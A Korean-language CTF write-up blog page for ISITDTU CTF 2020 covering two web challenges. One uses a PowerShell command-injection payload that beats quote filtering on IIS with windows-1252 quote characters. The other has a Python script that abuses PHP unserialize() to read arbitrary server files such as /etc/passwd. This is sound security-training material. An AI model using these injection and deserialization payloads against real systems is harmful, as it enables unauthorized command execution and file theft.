@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="(Web) Unexploitable [984 pts] Unexploitable 문제는 Command Injection 문제입니다.    문제로 들어오면 위처럼 Debug 모드로 들어갈 수 있는 링크가 존재합니다. 123456789101112131415161718192021222324&lt;?phpinclude &quot;config.php&quot;;set">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISITDTU CTF 2020 Write Up">
+<meta property="og:url" content="http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/index.html">
+<meta property="og:site_name" content="Home">
+<meta property="og:description" content="(Web) Unexploitable [984 pts] Unexploitable 문제는 Command Injection 문제입니다.    문제로 들어오면 위처럼 Debug 모드로 들어갈 수 있는 링크가 존재합니다. 123456789101112131415161718192021222324&lt;?phpinclude &quot;config.php&quot;;set">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/bBTsc9/btqKTFXChn9/wZaECUxbarmKUIG078oke1/img.png">
+<meta property="og:image" content="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/xgfaO/btqKRNWmmGI/MKWWaBxMOhVtTCDK8dSNk0/img.png">
+<meta property="og:image" content="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/ArYWb/btqKOB3u5Fo/sKRkzkc5MkgB09kZex9DgK/img.png">
+<meta property="og:image" content="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/b8aQeq/btqKShpoFPE/Abj0m62SOGD6Nrk3ZwiOhK/img.png">
+<meta property="og:image" content="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/bxipKP/btqKMz6dIb7/oTfMTrk2YXcfBYQMScrgc1/img.png">
+<meta property="og:image" content="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cqno3T/btqKTG3qpro/jncPfrlLytMkGCkoyKjuWk/img.png">
+<meta property="og:image" content="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/dneNEx/btqKROgS2KF/PCkQfbI9xsTU4Nxo1k1knK/img.png">
+<meta property="article:published_time" content="2020-10-14T00:00:11.000Z">
+<meta property="article:modified_time" content="2021-05-10T20:27:09.497Z">
+<meta property="article:author" content="Jeongwon Jo">
+<meta property="article:tag" content="PHP Object Injection">
+<meta property="article:tag" content="Command Injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/bBTsc9/btqKTFXChn9/wZaECUxbarmKUIG078oke1/img.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ISITDTU CTF 2020 Write Up</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/10/14/2020-10-19-N1-CTF.2020/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/07/26/2020-07-26-3K-CTF-2020/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&text=ISITDTU CTF 2020 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&title=ISITDTU CTF 2020 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&is_video=false&description=ISITDTU CTF 2020 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ISITDTU CTF 2020 Write Up&body=Check out this article: http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&title=ISITDTU CTF 2020 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&title=ISITDTU CTF 2020 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&title=ISITDTU CTF 2020 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&title=ISITDTU CTF 2020 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&name=ISITDTU CTF 2020 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&t=ISITDTU CTF 2020 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Unexploitable-984-pts"><span class="toc-number">1.</span> <span class="toc-text">(Web) Unexploitable [984 pts]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Warmup-XXX-pts"><span class="toc-number"></span> <span class="toc-text">(Web) Warmup [XXX pts]</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ISITDTU CTF 2020 Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Jeongwon Jo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-10-14T00:00:11.000Z" itemprop="datePublished">2020-10-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Command-Injection/" rel="tag">Command Injection</a>, <a class="tag-link-link" href="/tags/PHP-Object-Injection/" rel="tag">PHP Object Injection</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web-Unexploitable-984-pts"><a href="#Web-Unexploitable-984-pts" class="headerlink" title="(Web) Unexploitable [984 pts]"></a>(Web) Unexploitable [984 pts]</h2><blockquote>
+<p>Unexploitable 문제는 Command Injection 문제입니다. </p>
+</blockquote>
+<p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/bBTsc9/btqKTFXChn9/wZaECUxbarmKUIG078oke1/img.png"></p>
+<p>문제로 들어오면 위처럼 Debug 모드로 들어갈 수 있는 링크가 존재합니다.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line">set_time_limit(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = remove_quot(<span class="variable">$host</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$san_host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;powershell -Command ping -n 1 &#x27;<span class="subst">$san_host</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;a href=<span class="string">&quot;?debug&quot;</span>&gt;Debug&lt;/a&gt; Debug</span><br></pre></td></tr></table></figure>
+<p>그래서 일단 Debug 모드로 들어오니 PHP 코드가 보이는 것을 볼 수 있습니다. 코드를 보면 host 값을 가져와서 remove_quot() 함수를 이용해서 모든 쿼터들을 제거하고, escapeshellcmd() 함수를 이용해서 특수 문자 앞에 슬래쉬를 붙여 $san_host 변수에 넣어주는 것을 볼 수 있습니다.</p>
+<p>그리고 마지막으로 system() 함수를 실행시키는 데 이때 저희가 입력한 값이 들어가는 것을 볼 수 있습니다. 여기서 저는 <code>Command Injection</code> 문제라고 생각했습니다.</p>
+<p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/xgfaO/btqKRNWmmGI/MKWWaBxMOhVtTCDK8dSNk0/img.png"></p>
+<p>하지만 필터링에 의해서 싱글 쿼터를 사용할 수 없기 때문에 ping 명령어를 탈출할 수 없었습니다. 그러다가 우연히 문제 <code>Domain</code>만 치고 들어가니 해당 서버가 <code>windows server</code>인 <code>iis</code>를 사용하고 있는 것을 알 수 있었습니다.</p>
+<p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/ArYWb/btqKOB3u5Fo/sKRkzkc5MkgB09kZex9DgK/img.png"></p>
+<p>그래서 윈도우 서버 특수 문자를 키워드로 검색을 해보니 <code>windows-1252</code> 방식으로 이루어진 특수 문자가 존재하는 것을 볼 수 있었습니다. 위 사진을 보시면 82, 91, 92는 싱글 쿼터를 대체할 수 있는 거 같고, 84, 93, 94는 더블 쿼터를 대체할 수 있는 거 같습니다.</p>
+<p>한 번 이를 이용해서 ping 명령어를 탈출해서 다른 명령어를 실행시켜보겠습니다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command ping -n 1 &#39;141.164.55.161&#39;; ls &#39;&#39;</span><br></pre></td></tr></table></figure>
+<p>위와 같이 만들어주면 ping 명령어가 실행되고 나서 ls 명령어가 실행이 될 것입니다.</p>
+<p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/b8aQeq/btqKShpoFPE/Abj0m62SOGD6Nrk3ZwiOhK/img.png"></p>
+<p>저는 82, 91, 92 중에서 92를 사용해서 싱글 쿼터를 대체하고, 이를 이용해서 ls 명령어를 실행해보니 config.php, flag.php, index.php 파일이 존재하는 것을 알 수 있었습니다.</p>
+<p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/bxipKP/btqKMz6dIb7/oTfMTrk2YXcfBYQMScrgc1/img.png"></p>
+<p>마지막으로 cat 명령어를 이용해서 <code>flag.php</code> 파일을 읽어보니 FLAG가 들어있는 것을 볼 수 있었습니다. 이번 문제를 풀면서 처음으로 IIS 서버에서 싱글 쿼터를 우회하는 방법을 알게 되었고, windows-1252 인코딩 방식이 있다는 것도 알 수 있었습니다.</p>
+<blockquote>
+<p>FLAG : ISITDTU{6d77c41b70c235d1b077ad65e274a3c948bf56eb}</p>
+</blockquote>
+<hr>
+<h1 id="Web-Warmup-XXX-pts"><a href="#Web-Warmup-XXX-pts" class="headerlink" title="(Web) Warmup [XXX pts]"></a>(Web) Warmup [XXX pts]</h1><blockquote>
+<p>Warmup 문제는 간단한 PHP Object Injection 였는데 엄청난 실수로 풀지 못 했습니다.</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        unserialize(<span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>해당 문제로 들어오게 되면 위와 같은 PHP 코드가 보이는 것을 볼 수 있습니다. 일단 입력값을 <code>unserialize()</code> 메서드를 이용해서 역직렬화를 해주는 것을 보아  <code>PHP Object Injection</code>이라고 생각이 들었습니다. 하지만 <code>__wakeup()</code> 함수를 처음 보아서 이와 관련해서 조금 검색을 해보았습니다. </p>
+<p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cqno3T/btqKTG3qpro/jncPfrlLytMkGCkoyKjuWk/img.png"></p>
+<p>검색을 해보니 <code>__wakeup()</code> 함수가 사용된 문제들이 많이 출제됐던 거 같습니다. 저만 이번에 처음 보는 거군요. 여하튼 위를 이용해서 <code>PHP Object Injection</code> 공격을 시도했습니다. </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	path = <span class="built_in">input</span>(<span class="string">&quot;File Nmae : &quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> path == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	path_len = <span class="built_in">len</span>(path)</span><br><span class="line">	url = <span class="string">&#x27;http://35.220.140.18:5000/?username=&amp;password=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;flag&quot;;s:&#x27;</span> + <span class="built_in">str</span>(path_len) + <span class="string">&#x27;:&quot;&#x27;</span> + path  +<span class="string">&#x27;&quot;;&#125;&#x27;</span></span><br><span class="line">	res = requests.get(url)</span><br><span class="line">	print(res.text)</span><br></pre></td></tr></table></figure>
+<p>위와 같이 익스플로잇 코드를 작성해서 <code>/etc/passwd</code>, 아파치 설정 파일과 같은 것들을 모두 뒤져보았지만 결국 플래그를 획득하지 못 했습니다.</p>
+<p>그러다가 오늘 오후 12시 45분쯤에 갑자기 생각이 나서 아는 분께 여쭤보니. robots.txt 파일에 플래그 파일이 있다고 하셨습니다. 너무 허무했습니다.</p>
+<p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/dneNEx/btqKROgS2KF/PCkQfbI9xsTU4Nxo1k1knK/img.png"></p>
+<p>그래서 robots.txt 파일을 확인해 보니 <code>fl4g.php</code> 파일인 것을 알 수 있었습니다 :( fl4g.php 파일을 릭해 플래그를 획득할 수 있었습니다.</p>
+<blockquote>
+<p>FLAG : ISITDTU{4re_y0u_w4rm?}</p>
+</blockquote>
+<hr>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Unexploitable-984-pts"><span class="toc-number">1.</span> <span class="toc-text">(Web) Unexploitable [984 pts]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Warmup-XXX-pts"><span class="toc-number"></span> <span class="toc-text">(Web) Warmup [XXX pts]</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&text=ISITDTU CTF 2020 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&title=ISITDTU CTF 2020 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&is_video=false&description=ISITDTU CTF 2020 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ISITDTU CTF 2020 Write Up&body=Check out this article: http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&title=ISITDTU CTF 2020 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&title=ISITDTU CTF 2020 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&title=ISITDTU CTF 2020 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&title=ISITDTU CTF 2020 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&name=ISITDTU CTF 2020 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/10/14/2020-10-14-ISITDTU-CTF-2020/&t=ISITDTU CTF 2020 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Jeongwon Jo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'https-pocas-kr';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
